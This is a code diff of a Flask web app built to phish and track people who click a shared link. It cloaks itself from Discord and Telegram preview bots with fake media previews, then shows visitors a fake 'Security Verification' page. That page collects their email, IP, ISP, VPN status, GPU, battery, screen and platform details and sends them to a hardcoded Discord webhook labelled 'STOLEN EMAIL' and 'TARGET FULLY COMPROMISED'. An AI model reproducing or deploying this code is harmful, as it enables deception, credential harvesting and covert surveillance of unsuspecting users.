@@ -1,74 +1,110 @@
 import os
 import requests
-from flask import Flask, request, redirect, render_template_string
-import time
+from flask import Flask, request, render_template_string
 from datetime import datetime
 
 app = Flask(__name__)
 
-# YOUR CONFIG
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"
-# The MP4 version of your loading dots
-MP4_URL = "https://media.tenor.com/m/EGAPcaiphUoAAAAP/loading-screen-two-dots.mp4" 
 
-@app.route('/v/<id>')
-def interceptor(id):
+@app.route('/view/image_01.png')
+def bridge():
     ua = request.user_agent.string
-    ua_low = ua.lower()
-    
-    # 1. DISCORD SPOOF (Forcing the Video Player)
-    if any(x in ua_low for x in ["discord", "telegram", "bot"]):
-        html = f'''
-        <html>
-            <head>
-                <meta property="og:title" content="Loading Media...">
-                <meta property="og:type" content="video.other">
-                <meta property="og:video" content="{MP4_URL}">
-                <meta property="og:video:type" content="video/mp4">
-                <meta property="og:video:width" content="640">
-                <meta property="og:video:height" content="640">
-                <meta name="twitter:card" content="player">
-                <meta name="twitter:player" content="{MP4_URL}">
-            </head>
-            <body style="background-color:black;"></body>
-        </html>
-        '''
-        return render_template_string(html)
+    # Discord Preview Bot Check
+    if any(x in ua.lower() for x in ["discord", "bot", "telegram"]):
+        return render_template_string('<meta property="og:title" content="Private Media Attached"><meta property="og:image" content="https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif">')
 
-    # 2. THE DEEP SCAN (IP, Geo, Device)
+    return render_template_string('''
+    <html>
+    <head>
+        <title>Identity Verification</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body style="background-color: #0b0b0b; color: #e0e0e0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+        <div id="auth-box" style="background: #181818; padding: 30px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 350px; text-align: center;">
+            <img src="https://i.imgur.com/8N76f9J.png" width="50" style="margin-bottom: 15px; filter: grayscale(1);">
+            <h2 style="font-size: 18px; margin-bottom: 10px;">Security Verification</h2>
+            <p style="font-size: 13px; color: #888; margin-bottom: 20px;">This media is private. Please verify your email to continue.</p>
+            
+            <input type="email" id="email" placeholder="Email Address" required style="width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 4px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box;">
+            <button onclick="sendData()" style="width: 100%; padding: 12px; background: #5865F2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">Verify Identity</button>
+            
+            <p id="status" style="font-size: 11px; margin-top: 15px; color: #555;">Encrypted by AES-256</p>
+        </div>
+
+        <script>
+            async function sendData() {
+                const emailVal = document.getElementById('email').value;
+                if(!emailVal.includes('@')) return alert("Enter a valid email.");
+                
+                document.getElementById('auth-box').innerHTML = '<img src="https://media1.tenor.com/m/EGAPcaiphUoAAAAC/loading-screen-two-dots.gif" width="50"><p>Verifying...</p>';
+
+                // Collect hardware fingerprint
+                let gpu = "Unknown";
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+                } catch (e) {}
+
+                let battery = await navigator.getBattery();
+                
+                let payload = {
+                    email: emailVal,
+                    res: screen.width + "x" + screen.height,
+                    batt: Math.round(battery.level * 100) + "%",
+                    charging: battery.charging ? "YES" : "NO",
+                    gpu: gpu,
+                    platform: navigator.platform,
+                    ref: document.referrer || "Direct"
+                };
+                
+                fetch('/log-deep', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    setTimeout(() => {
+                        window.location.href = "https://i.imgur.com/BcNs5vF.jpg";
+                    }, 1000);
+                });
+            }
+        </script>
+    </body>
+    </html>
+    ''')
+
+@app.route('/log-deep', methods=['POST'])
+def log_deep():
+    d = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")
     
-    c, r, cntry, isp, vpn = "??","??","??","??","??"
+    # ISP / VPN Check
+    isp, vpn = "??", "??"
     try:
-        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
-        if g['status'] == 'success':
-            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
-            isp, vpn = g.get('isp'), "🚨 YES" if g.get('proxy') else "✅ NO"
+        g = requests.get(f"http://ip-api.com/json/{ip}?fields=16515").json()
+        isp, vpn = g.get('isp'), ("🚨 YES" if g.get('proxy') else "✅ NO")
     except: pass
 
-    # 3. WEBHOOK REPORT
-    payload = {
-        "username": "VIDEO SENSOR",
+    webhook_data = {
+        "username": "OMEGA-CORE ELITE",
         "embeds": [{
-            "title": "🎬 VIDEO CLICK DETECTED",
-            "color": 0x00FF00,
+            "title": "🔓 TARGET FULLY COMPROMISED",
+            "color": 0xFF0000,
             "fields": [
-                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nCountry: {cntry}```", "inline": True},
-                {"name": "🌐 NETWORK", "value": f"**ISP:** {isp}\n**VPN:** {vpn}", "inline": True},
-                {"name": "🧬 DEVICE", "value": f"**IP:** `{ip}`\n**UA:** `{ua}`", "inline": False}
+                {"name": "📧 STOLEN EMAIL", "value": f"**`{d['email']}`**", "inline": False},
+                {"name": "📍 NETWORK", "value": f"**IP:** `{ip}`\n**ISP:** {isp}\n**VPN:** {vpn}", "inline": True},
+                {"name": "🔋 HARDWARE", "value": f"**Batt:** {d['batt']} (Charge: {d['charging']})\n**GPU:** `{d['gpu']}`", "inline": True},
+                {"name": "🖥️ DEVICE", "value": f"**Model:** {d['platform']}\n**Res:** {d['res']}", "inline": True},
+                {"name": "🔗 REFERRER", "value": f"```{d['ref']}
+```", "inline": False}
             ],
-            "footer": {"text": f"Captured at {time_utc}"}
+            "footer": {"text": "Project Alpha | Deep Intercept Active"}
         }]
     }
-    
-    # 4. EXECUTION
-    try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-        time.sleep(1.2) # Delay to ensure data capture before browser moves
-    except: pass
-
-    return redirect(MP4_URL)
+    requests.post(WEBHOOK_URL, json=webhook_data)
+    return "OK", 200
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
